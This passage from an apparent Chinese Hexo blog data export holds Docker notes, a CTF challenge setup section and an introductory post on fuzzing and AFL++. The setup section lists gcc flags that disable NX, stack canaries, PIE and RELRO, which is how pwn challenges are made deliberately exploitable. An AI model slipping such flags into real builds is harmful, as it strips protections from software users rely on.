–cap-drop 可以<strong>添加</strong>或<strong>禁用</strong>特定的权限，–privileged可以开放所有的权限。</p>\n<figure class=\"highlight docker\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker <span class=\"keyword\">run</span><span class=\"language-bash\"> -it --cap-add SYS_TIME --<span class=\"built_in\">rm</span> --name centos /bin/sh //开放了SYS_TIME的权限</span></span><br><span class=\"line\">//--rm代表运行完自动删除</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"缓存清理\"><a href=\"#缓存清理\" class=\"headerlink\" title=\"缓存清理\"></a>缓存清理</h3><p>当镜像太多的时候，会占用不少的空间，此时可以清理缓存让自己多点空间可用。在使用build新建容器的时候，为了减少之后build所需的时间，部分内容会存入cache当中，如果空间太大了可以手动清空一下缓存：</p>\n<figure class=\"highlight docker\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker builder prune</span><br></pre></td></tr></table></figure>\n\n<p>清除所有镜像（慎用）</p>\n<figure class=\"highlight docker\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker image prune</span><br></pre></td></tr></table></figure>\n\n<p>清除所有网络、容器、镜像和缓存（慎用）</p>\n<figure class=\"highlight docker\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker system prune</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Docker-Compose\"><a href=\"#Docker-Compose\" class=\"headerlink\" title=\"Docker Compose\"></a>Docker Compose</h2><p>Compose 是用于定义和运行多容器 Docker 应用程序的工具。通过 Compose，您可以使用 YML 文件来<strong>配置应用程序需要的所有服务</strong>。然后，使用一个命令，就可以从 YML 文件配置中创建并启动所有服务。</p>\n<h3 id=\"YAML\"><a href=\"#YAML\" class=\"headerlink\" title=\"YAML\"></a>YAML</h3><p>YAML 的语法和其他高级语言类似，并且可以简单表达清单、散列表，标量等数据形态。它使用空白符号缩进和大量依赖外观的特色，特别适合用来表达或编辑数据结构、各种配置文件、倾印调试内容、文件大纲（例如：许多电子邮件标题格式和YAML非常接近）。YAML 的配置文件后缀为 .yml</p>\n<p>基本语法:</p>\n<ul>\n<li>大小写敏感</li>\n<li>使用缩进表示层级关系</li>\n<li>缩进不允许使用tab，只允许空格</li>\n<li>缩进的空格数不重要，只要相同层级的元素左对齐即可</li>\n<li>‘#’表示注释</li>\n</ul>\n<h4 id=\"YAML对象\"><a href=\"#YAML对象\" class=\"headerlink\" title=\"YAML对象\"></a>YAML对象</h4><p>对象键值对使用冒号结构表示 key: value，<strong>冒号后面要加一个空格</strong>。</p>\n<p>对象之间可以嵌套，使用缩进表示层级关系。</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">key:</span> </span><br><span class=\"line\">    <span class=\"attr\">child_key1:</span> <span class=\"string\">value1</span></span><br><span class=\"line\">    <span class=\"attr\">child_key2:</span> <span class=\"string\">value2</span></span><br></pre></td></tr></table></figure>\n\n<p>如果有复杂的对象，可以使用?加空格表示复杂的key，使用:加空格表示value。</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">?</span> </span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"string\">key1</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"string\">key2</span></span><br><span class=\"line\"><span class=\"string\">:</span> </span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"string\">value1</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"string\">value2</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"YAML数组\"><a href=\"#YAML数组\" class=\"headerlink\" title=\"YAML数组\"></a>YAML数组</h4><p>用- 开头的行表示一个数组</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"string\">A</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"string\">B</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"string\">C</span></span><br></pre></td></tr></table></figure>\n\n<p>表示数组[A,B,C]</p>\n<p>可以支持多维数组：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"bullet\">-</span> </span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">A</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">B</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">C</span></span><br></pre></td></tr></table></figure>\n\n<p>表示[[A,B,C]]</p>\n<p>数组也可以使用流式(flow)的方式表示：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">companies:</span> [&#123;<span class=\"attr\">id:</span> <span class=\"number\">1</span>,<span class=\"attr\">name:</span> <span class=\"string\">company1</span>,<span class=\"attr\">price:</span> <span class=\"string\">200W</span>&#125;,&#123;<span class=\"attr\">id:</span> <span class=\"number\">2</span>,<span class=\"attr\">name:</span> <span class=\"string\">company2</span>,<span class=\"attr\">price:</span> <span class=\"string\">500W</span>&#125;]</span><br></pre></td></tr></table></figure>\n\n<p>数组和对象可以构成复合结构。</p>\n<h4 id=\"纯量\"><a href=\"#纯量\" class=\"headerlink\" title=\"纯量\"></a>纯量</h4><p>最基本的不可再分的值，包括：字符串（可以拆成多行，每一行会被转化成一个空格）、布尔值、整数、浮点数、Null、时间（使用ISO 8601格式，时间和日期之间使用T连接，最后使用+代表时区）、日期（必须使用ISO 8601格式，即yyyy-MM-dd）。</p>\n<h4 id=\"锚点和引用\"><a href=\"#锚点和引用\" class=\"headerlink\" title=\"锚点和引用\"></a>锚点和引用</h4><p>用&amp;表示建立锚点，用*表示引用锚点。</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">defaults:</span> <span class=\"meta\">&amp;defaults</span></span><br><span class=\"line\">  <span class=\"attr\">adapter:</span>  <span class=\"string\">postgres</span></span><br><span class=\"line\">  <span class=\"attr\">host:</span>     <span class=\"string\">localhost</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">development:</span></span><br><span class=\"line\">  <span class=\"attr\">database:</span> <span class=\"string\">myapp_development</span></span><br><span class=\"line\">  <span class=\"string\">&lt;&lt;:</span> <span class=\"meta\">*defaults</span></span><br></pre></td></tr></table></figure>\n\n<p>相当于:</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">defaults:</span></span><br><span class=\"line\">  <span class=\"attr\">adapter:</span>  <span class=\"string\">postgres</span></span><br><span class=\"line\">  <span class=\"attr\">host:</span>     <span class=\"string\">localhost</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">development:</span></span><br><span class=\"line\">  <span class=\"attr\">database:</span> <span class=\"string\">myapp_development</span></span><br><span class=\"line\">  <span class=\"attr\">adapter:</span>  <span class=\"string\">postgres</span></span><br><span class=\"line\">  <span class=\"attr\">host:</span>     <span class=\"string\">localhost</span></span><br></pre></td></tr></table></figure>\n\n<p>&lt;&lt;表示合并到当前数据。</p>\n<h3 id=\"本次出题\"><a href=\"#本次出题\" class=\"headerlink\" title=\"本次出题\"></a>本次出题</h3><figure class=\"highlight docker\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker build -t <span class=\"string\">&quot;problem_name&quot;</span> .</span><br><span class=\"line\">docker <span class=\"keyword\">run</span><span class=\"language-bash\"> -d -p <span class=\"string\">&quot;0.0.0.0:pub_port:9999&quot;</span> -h <span class=\"string\">&quot;hostname&quot;</span> --name=<span class=\"string\">&quot;container_name&quot;</span> problem_name</span></span><br></pre></td></tr></table></figure>\n\n<p>编译</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># NX保护机制：</span></span><br><span class=\"line\">-z execstack / -z noexecstack  <span class=\"comment\"># (关闭 / 开启) 堆栈不可执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Canary：(关闭 / 开启 / 全开启) 栈里插入cookie信息</span></span><br><span class=\"line\"><span class=\"comment\"># !开canary好像会造成栈中局部变量的顺序有所改变</span></span><br><span class=\"line\">-fno-stack-protector /-fstack-protector / -fstack-protector-all </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ASLR和PIE：</span></span><br><span class=\"line\">-no-pie / -pie   <span class=\"comment\"># (关闭 / 开启) 地址随机化，另外打开后会有get_pc_thunk</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># RELRO：</span></span><br><span class=\"line\">-z norelro / -z lazy / -z now   <span class=\"comment\"># (关闭 / 部分开启 / 完全开启) 对GOT表具有写权限</span></span><br><span class=\"line\"></span><br><span class=\"line\">-s   <span class=\"comment\"># 去除符号表</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>"},{"title":"Fuzzing","date":"2023-04-03T02:13:03.000Z","_content":"\n模糊测试 （fuzz testing, fuzzing）是一种软件测试技术。其核心思想是自动或半自动的生成随机数据输入到一个程序中，并监视程序异常，如崩溃，断言(assertion)失败，以发现可能的程序错误，比如内存泄漏。模糊测试常常用于检测软件或计算机系统的安全漏洞。\n\n<!--more-->\n\n## Fuzzing原理\n\n黑盒测试是一种检验程序功能是否可以正常使用的测试方法。它将程序模块看作是一个**不能打开的黑盒**，**忽略程序模块的内部逻辑结构**，对程序**接口**进行测试，检查程序能否正常的接受输入数据并产生正确的输出。\n\n**灰盒**模糊测试也是越来越流行的检测方式之一，它利用**检测**而不是程序分析来收集有关程序的信息。例如在程序中进行**插桩**，可以获得一条fuzzing用例在执行时对应的代码覆盖率。如果接触到了更多的程序内容，它就把这一条用例记录下来，用于改进fuzzing的效果。\n\nFuzzing技术是一种基于**黑盒（或灰盒）**的测试技术，通过**自动化生成**并执行大量的随机测试用例来发现产品或协议的未知漏洞。\n\n对于复杂的程序，输入用例的数量极大，不可能对其进行穷举，只能对部分可能的异常情景进行测试。然而人脑难以考虑到所有异常情景的组合，Fuzzing的出现就是为了解决这个问题。Fuzzing技术本质是依靠**随机函数生成随机测试用例**来进行测试验证。\n\n## Fuzzing的基本算法\n\nFuzzing引擎算法中，测试用例的生成方式主要有2种：\n\n1. 基于变异：根据已知数据样本通过变异的方法生成新的测试用例；\n\n2. 基于生成：根据已知的协议或接口规范进行建模，生成测试用例；\n\n一般Fuzzing工具中，都会综合使用这两种生成方式，不同的Fuzzer的用例生成方式有所不同。\n\n这两种算法只是一般Fuzzing生成测试用例的算法的基本思想，在此之上实现的算法有太多了。\n\n## Fuzzer的工作流程\n\nFuzzer需要通过策略不断生成随机数据并将其输入给程序，并检查程序是否有`crash`，之后根据结果优化生成策略，循环上述步骤持续地进行Fuzzing。\n\n上述步骤只是一个极简的Fuzzer工作流程，对不同的Fuzzer工作流程可能会有一些差别，但也可从中看出，其中最重要的就是**生成随机数据的部分**。\n\n部分Fuzzer还用到了灰盒测试的技术，在程序之中**插桩**来**检测生成用例的代码覆盖率**。\n\n### AFL++的工作流程\n\nAFL++是 Google 的 AFL 的一个分支，是一个基于突变的Fuzzer，通过遗传算法生成新的随机数据。\n\n1. 从源码编译程序时进行插桩，以记录代码覆盖率（Code Coverage）；\n2. 选择一些输入文件，作为初始测试集加入输入队列（queue）；\n3. 将队列中的文件按一定的策略进行“突变”；\n4. 如果经过变异文件更新了覆盖范围，则将其保留添加到队列中;\n5. 上述过程会一直循环进行，期间触发了crash的文件会被记录下来\n\n**执行流：**\n\n```mermaid\ngraph LR\nA[插桩] --> B[初始化队列]\nB --> C[突变]\nC --> D[输入程序]\nD --> E[检测运行结果]\nE --> F[更新队列]\nF --> G[记录crash]\nG --> C\n```\n\n**数据流：**\n\n```mermaid\ngraph LR\nA[初始测试集] -->|文件集| B\nB[队列] -->|文件| C\nC[变异引擎] -->|突变文件| D[程序]\nD -->|运行结果| F[检测引擎]\nF -->|突变文件 if 更新了覆盖范围| B\nF -->|crash文件| G[记录crash]\n\n```\n\n对AFL++而言，生成随机数据的部分，即**变异引擎**是最重要的部分。\n\n## Fuzzer的结构\n\n先从最简单的Fuzzer开始：\n\n- 变异引擎：用于根据原有的文件产生新的文件（一般以数据的形式进行变异）\n- 控制模块：\n    - 存储Fuzzer的重要参数\n    - 控制Fuzzer不断工作\n        - 给程序输入数据\n        - 判断程序接受输入后的结果\n        - 根据运行结果执行不同的操作\n    - 显示Fuzzer的运行状态\n\n这应该是最基本的Fuzzer结构。\n\n当然在此基础之上有许多值得优化的部分：\n\n- 引入灰盒测试思想（插桩之类的技术）\n- **变异引擎的变异策略（最重要的）**\n- 结合**生成式**的策略\n- 对`crash`的区分和描述\n- ...\n\n## Fuzzer性能的衡量标准\n\n要判断对Fuzzer的改进是否有效，我们需要知道怎样的Fuzzer是一个好的Fuzzer，这需要一些指标去评价一个Fuzzer。\n\n- 一次fuzzing所需时间\n- `crash`产生的速率\n- 路径覆盖率\n- 覆盖率粒度\n- ...\n\n\n\n\n\n","source":"_posts/Fuzzing.md","raw":"---\ntitle: Fuzzing\ndate: 2023-04-03 10:13:03\ncategories: \n- fuzzing\ntags: \n- fuzzing\n\n---\n\n模糊测试 （fuzz testing, fuzzing）是一种软件测试技术。其核心思想是自动或半自动的生成随机数据输入到一个程序中，并监视程序异常，如崩溃，断言(assertion)失败，以发现可能的程序错误，比如内存泄漏。模糊测试常常用于检测软件或计算机系统的安全漏洞。\n\n<!--more-->\n\n## Fuzzing原理\n\n黑盒测试是一种检验程序功能是否可以正常使用的测试方法。它将程序模块看作是一个**不能打开的黑盒**，**忽略程序模块的内部逻辑结构**，对程序**接口**进行测试，检查程序能否正常的接受输入数据并产生正确的输出。\n\n**灰盒**模糊测试也是越来越流行的检测方式之一，它利用**检测**而不是程序分析来收集有关程序的信息。例如在程序中进行**插桩**，可以获得一条fuzzing用例在执行时对应的代码覆盖率。如果接触到了更多的程序内容，它就把这一条用例记录下来，用于改进fuzzing的效果。\n\nFuzzing技术是一种基于**黑盒（或灰盒）**的测试技术，通过**自动化生成**并执行大量的随机测试用例来发现产品或协议的未知漏洞。\n\n对于复杂的程序，输入用例的数量极大，不可能对其进行穷举，只能对部分可能的异常情景进行测试。然而人脑难以考虑到所有异常情景的组合，Fuzzing的出现就是为了解决这个问题。Fuzzing技术本质是依靠**随机函数生成随机测试用例**来进行测试验证。\n\n## Fuzzing的基本算法\n\nFuzzing引擎算法中，测试用例的生成方式主要有2种：\n\n1. 基于变异：根据已知数据样本通过变异的方法生成新的测试用例；\n\n2. 基于生成：根据已知的协议或接口规范进行建模，生成测试用例；\n\n一般Fuzzing工具中，都会综合使用这两种生成方式，不同的Fuzzer的用例生成方式有所不同。\n\n这两种算法只是一般Fuzzing生成测试用例的算法的基本思想，在此之上实现的算法有太多了。\n\n## Fuzzer的工作流程\n\nFuzzer需要通过策略不断生成随机数据并将其输入给程序，并检查程序是否有`crash`，之后根据结果优化生成策略，循环上述步骤持续地进行Fuzzing。\n\n上述步骤只是一个极简的Fuzzer工作流程，对不同的Fuzzer工作流程可能会有一些差别，但也可从中看出，其中最重要的就是**生成随机数据的部分**。\n\n部分Fuzzer还用到了灰盒测试的技术，在程序之中**插桩**来**检测生成用例的代码覆盖率**。\n\n### AFL++的工作流程\n\nAFL++是 Google 的 AFL 的一个分支，是一个基于突变的Fuzzer，通过遗传算法生成新的随机数据。\n\n1. 从源码编译程序时进行插桩，以记录代码覆盖率（Code Coverage）；\n2. 选择一些输入文件，作为初始测试集加入输入队列（queue）；\n3. 将队列中的文件按一定的策略进行“突变”；\n4. 如果经过变异文件更新了覆盖范围，则将其保留添加到队列中;\n5. 上述过程会一直循环进行，期间触发了crash的文件会被记录下来\n\n**执行流：**\n\n```mermaid\ngraph LR\nA[插桩] --> B[初始化队列]\nB --> C[突变]\nC --> D[输入程序]\nD --> E[检测运行结果]\nE --> F[更新队列]\nF --> G[记录crash]\nG --> C\n```\n\n**数据流：**\n\n```mermaid\ngraph LR\nA[初始测试集] -->|文件集| B\nB[队列] -->|文件| C\nC[变异引擎] -->|突变文件| D[程序]\nD -->|运行结果| F[检测引擎]\nF -->|突变文件 if 更新了覆盖范围| B\nF -->|crash文件| G[记录crash]\n\n```\n\n对AFL++而言，生成随机数据的部分，即**变异引擎**是最重要的部分。\n\n## Fuzzer的结构\n\n先从最简单的Fuzzer开始：\n\n- 变异引擎：用于根据原有的文件产生新的文件（一般以数据的形式进行变异）\n- 控制模块：\n    - 存储Fuzzer的重要参数\n    - 控制Fuzzer不断工作\n        - 给程序输入数据\n        - 判断程序接受输入后的结果\n        - 根据运行结果执行不同的操作\n    - 显示Fuzzer的运行状态\n\n这应该是最基本的Fuzzer结构。\n\n当然在此基础之上有许多值得优化的部分：\n\n- 引入灰盒测试思想（插桩之类的技术）\n- **变异引擎的变异策略（最重要的）**\n- 结合**生成式**的策略\n- 对`crash`的区分和描述\n- ...\n\n## Fuzzer性能的衡量标准\n\n要判断对Fuzzer的改进是否有效，我们需要知道怎样的Fuzzer是一个好的Fuzzer，这需要一些指标去评价一个Fuzzer。\n\n- 一次fuzzing所需时间\n- `crash`产生的速率\n- 路径覆盖率\n- 覆盖率粒度\n- ...\n\n\n\n\n\n","slug":"Fuzzing","published":1,"updated":"2023-04-03T07:24:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czaf1000d5oudhxe25erp","content":"<p>模糊测试 （fuzz testing, fuzzing）是一种软件测试技术。其核心思想是自动或半自动的生成随机数据输入到一个程序中，并监视程序异常，如崩溃，断言(assertion)失败，以发现可能的程序错误，比如内存泄漏。模糊测试常常用于检测软件或计算机系统的安全漏洞。</p>\n<span id=\"more\"></span>\n\n<h2 id=\"Fuzzing原理\"><a href=\"#Fuzzing原理\" class=\"headerlink\" title=\"Fuzzing原理\"></a>Fuzzing原理</h2><p>黑盒测试是一种检验程序功能是否可以正常使用的测试方法。它将程序模块看作是一个<strong>不能打开的黑盒</strong>，<strong>忽略程序模块的内部逻辑结构</strong>，对程序<strong>接口</strong>进行测试，检查程序能否正常的接受输入数据并产生正确的输出。</p>\n<p><strong>灰盒</strong>模糊测试也是越来越流行的检测方式之一，它利用<strong>检测</strong>而不是程序分析来收集有关程序的信息。例如在程序中进行<strong>插桩</strong>，可以获得一条fuzzing用例在执行时对应的代码覆盖率。如果接触到了更多的程序内容，它就把这一条用例记录下来，用于改进fuzzing的效果。</p>\n<p>Fuzzing技术是一种基于<strong>黑盒（或灰盒）</strong>的测试技术，通过<strong>自动化生成</strong>并执行大量的随机测试用例来发现产品或协议的未知漏洞。</p>\n<p>对于复杂的程序，输入用例的数量极大，不可能对其进行穷举，只能对部分可能的异常情景进行测试。然而人脑难以考虑到所有异常情景的组合，Fuzzing的出现就是为了解决这个问题。Fuzzing技术本质是依靠<strong>随机函数生成随机测试用例</strong>来进行测试验证。</p>\n<h2 id=\"Fuzzing的基本算法\"><a href=\"#Fuzzing的基本算法\" class=\"headerlink\" title=\"Fuzzing的基本算法\"></a>Fuzzing的基本算法</h2><p>Fuzzing引擎算法中，测试用例的生成方式主要有2种：</p>\n<ol>\n<li><p>基于变异：根据已知数据样本通过变异的方法生成新的测试用例；</p>\n</li>\n<li><p>基于生成：根据已知的协议或接口规范进行建模，生成测试用例；</p>\n</li>\n</ol>\n<p>一般Fuzzing工具中，都会综合使用这两种生成方式，不同的Fuzzer的用例生成方式有所不同。</p>\n<p>这两种算法只是一般Fuzzing生成测试用例的算法的基本思想，在此之上实现的算法有太多了。</p>\n<h2 id=\"Fuzzer的工作流程\"><a href=\"#Fuzzer的工作流程\" class=\"headerlink\" title=\"Fuzzer的工作流程\"></a>Fuzzer的工作流程</h2><p>Fuzzer需要通过策略不断生成随机数据并将其输入给程序，并检查程序是否有<code>crash</code>，之后根据结果优化生成策略，循环上述步骤持续地进行Fuzzing。</p>\n<p>上述步骤只是一个极简的Fuzzer工作流程，对不同的Fuzzer工作流程可能会有一些差别，但也可从中看出，其中最重要的就是<strong>生成随机数据的部分</strong>。</p>\n<p>部分Fuzzer还用到了灰盒测试的技术，在程序之中<strong>插桩</strong>来<strong>检测生成用例的代码覆盖率</strong>。</p>\n<h3 id=\"AFL-的工作流程\"><a href=\"#AFL-的工作流程\" class=\"headerlink\" title=\"AFL++的工作流程\"></a>AFL++的工作流程</h3><p>AFL++是 Google 的 AFL 的一个分支，是一个基于突变的Fuzzer，通过遗传算法生成新的随机数据。</p>\n<ol>\n<li>从源码编译程序时进行插桩，以记录代码覆盖率（Code Coverage）；</li>\n<li>选择一些输入文件，作为初始测试集加入输入队列（queue）；</li>\n<li>将队列中的文件按一定的策略进行“突变”；</li>\n<li>如果经过变异文件更新了覆盖范围，则将其保留添加到队列中;</li>\n<li>上述过程会一直循环进行，期间触发了crash的文件会被记录下来</li>\n</ol>\n<p><strong>执行流：</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">graph LR</span><br><span class=\"line\">A[插桩] --&gt; B[初始化队列]</span><br><span class=\"line\">B --&gt; C[突变]</span><br><span class=\"line\">C --&gt; D[输入程序]</span><br><span class=\"line\">D --&gt; E[检测运行结果]</span><br><span class=\"line\">E --&gt; F[更新队列]</span><br><span class=\"line\">F --&gt; G[记录crash]</span><br><span class=\"line\">G --&gt; C</span><br></pre></td></tr></table></figure>\n\n<p><strong>数据流：</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">graph LR</span><br><span class=\"line\">A[初始测试集] --&gt;|文件集| B</span><br><span class=\"line\">B[队列] --&gt;|文件| C</span><br><span class=\"line\">C[变异引擎] --&gt;|突变文件| D[程序]</span><br><span class=\"line\">D --&gt;|运行结果| F[检测引擎]</span><br><span class=\"line\">F --&gt;|突变文件 if 更新了覆盖范围| B</span><br><span class=\"line\">F --&gt;|crash文件| G[记录crash]</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>对AFL++而言，生成随机数据的部分，即<strong>变异引擎</strong>是最重要的部分。</p>\n<h2 id=\"Fuzzer的结构\"><a href=\"#Fuzzer的结构\" class=\"headerlink\" title=\"Fuzzer的结构\"></a>Fuzzer的结构</h2><p>先从最简单的Fuzzer开始：</p>\n<ul>\n<li>变异引擎：用于根据原有的文件产生新的文件（一般以数据的形式进行变异）</li>\n<li>控制模块：<ul>\n<li>存储Fuzzer的重要参数</li>\n<li>控制Fuzzer不断工作<ul>\n<li>给程序输入数据</li>\n<li>判断程序接受输入后的结果</li>\n<li>根据运行结果执行不同的操作</li>\n</ul>\n</li>\n<li>显示Fuzzer的运行状态</li>\n</ul>\n</li>\n</ul>\n<p>这应该是最基本的Fuzzer结构。</p>\n<p>当然在此基础之上有许多值得优化的部分：</p>\n<ul>\n<li>引入灰盒测试思想（插桩之类的技术）</li>\n<li><strong>变异引擎的变异策略（最重要的）</strong></li>\n<li>结合<strong>生成式</strong>的策略</li>\n<li>对<code>crash</code>的区分和描述</li>\n<li>…</li>\n</ul>\n<h2 id=\"Fuzzer性能的衡量标准\"><a href=\"#Fuzzer性能的衡量标准\" class=\"headerlink\" title=\"Fuzzer性能的衡量标准\"></a>Fuzzer性能的衡量标准</h2><p>要判断对Fuzzer的改进是否有效，我们需要知道怎样的Fuzzer是一个好的Fuzzer，这需要一些指标去评价一个Fuzzer。</p>\n<ul>\n<li>一次fuzzing所需时间</li>\n<li><code>crash</code>产生的速率</li>\n<li>路径覆盖率</li>\n<li>覆盖率粒度</li>\n<li>…</li>\n</ul>\n","site":{"data":{}},"excerpt":"<p>模糊测试 （fuzz testing, fuzzing）是一种软件测试技术。其核心思想是自动或半自动的生成随机数据输入到一个程序中，并监视程序异常，如崩溃，断言(assertion)失败，以发现可能的程序错误，比如内存泄漏。模糊测试常常用于检测软件或计算机系统的安全漏洞。</p>","more":"<h2 id=\"Fuzzing原理\"><a href=\"#Fuzzing原理\" class=\"headerlink\" title=\"Fuzzing原理\"></a>Fuzzing原理</h2><p>黑盒测试是一种检验程序功能是否可以正常使用的测试方法。它将程序模块看作是一个<strong>不能打开的黑盒</strong>，<strong>忽略程序模块的内部逻辑结构</strong>，对程序<strong>接口</strong>进行测试，检查程序能否正常的接受输入数据并产生正确的输出。</p>\n<p><strong>灰盒</strong>模糊测试也是越来越流行的检测方式之一，它利用<strong>检测</strong>而不是程序分析来收集有关程序的信息。例如在程序中进行<strong>插桩</strong>，可以获得一条fuzzing用例在执行时对应的代码覆盖率。如果接触到了更多的程序内容，它就把这一条用例记录下来，用于改进fuzzing的效果。</p>\n<p>Fuzzing技术是一种基于<strong>黑盒（或灰盒）</strong>的测试技术，通过<strong>自动化生成</strong>并执行大量的随机测试用例来发现产品或协议的未知漏洞。</p>\n<p>对于复杂的程序，输入用例的数量极大，不可能对其进行穷举，只能对部分可能的异常情景进行测试。然而人脑难以考虑到所有异常情景的组合，Fuzzing的出现就是为了解决这个问题。Fuzzing技术本质是依靠<strong>随机函数生成随机测试用例</strong>来进行测试验证。</p>\n<h2 id=\"Fuzzing的基本算法\"><a href=\"#Fuzzing的基本算法\" class=\"headerlink\" title=\"Fuzzing的基本算法\"></a>Fuzzing的基本算法</h2><p>Fuzzing引擎算法中，测试用例的生成方式主要有2种：</p>\n<ol>\n<li><p>基于变异：根据已知数据样本通过变异的方法生成新的测试用例；</p>\n</li>\n<li><p>基于生成：根据已知的协议或接口规范进行建模，生成测试用例；</p>\n</li>\n</ol>\n<p>一般Fuzzing工具中，都会综合使用这两种生成方式，不同的Fuzzer的用例生成方式有所不同。</p>\n<p>这两种算法只是一般Fuzzing生成测试用例的算法的基本思想，在此之上实现的算法有太多了。</p>\n<h2 id=\"Fuzzer的工作流程\"><a href=\"#Fuzzer的工作流程\" class=\"headerlink\" title=\"Fuzzer的工作流程\"></a>Fuzzer的工作流程</h2><p>Fuzzer需要通过策略不断生成随机数据并将其输入给程序，并检查程序是否有<code>crash</code>，之后根据结果优化生成策略，循环上述步骤持续地进行Fuzzing。</p>\n<p>上述步骤只是一个极简的Fuzzer工作流程，对不同的Fuzzer工作流程可能会有一些差别，但也可从中看出，其中最重要的就是<strong>生成随机数据的部分</strong>。</p>\n<p>部分Fuzzer还用到了灰盒测试的技术，在程序之中<strong>插桩</strong>来<strong>检测生成用例的代码覆盖率</strong>。</p>\n<h3 id=\"AFL-的工作流程\"><a href=\"#AFL-的工作流程\" class=\"headerlink\" title=\"AFL++的工作流程\"></a>AFL++的工作流程</h3><p>AFL++是 Google 的 AFL 的一个分支，是一个基于突变的Fuzzer，通过遗传算法生成新的随机数据。</p>\n<ol>\n<li>从源码编译程序时进行插桩，以记录代码覆盖率（Code Coverage）；</li>\n<li>选择一些输入文件，作为初始测试集加入输入队列（queue）；</li>\n<li>将队列中的文件按一定的策略进行“突变”；</li>\n<li>如果经过变异文件更新了覆盖范围，则将其保留添加到队列中;</li>\n<li>上述过程会一直循环进行，期间触发了crash的文件会被记录下来</li>\n</ol>\n<p><strong>执行流：</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span 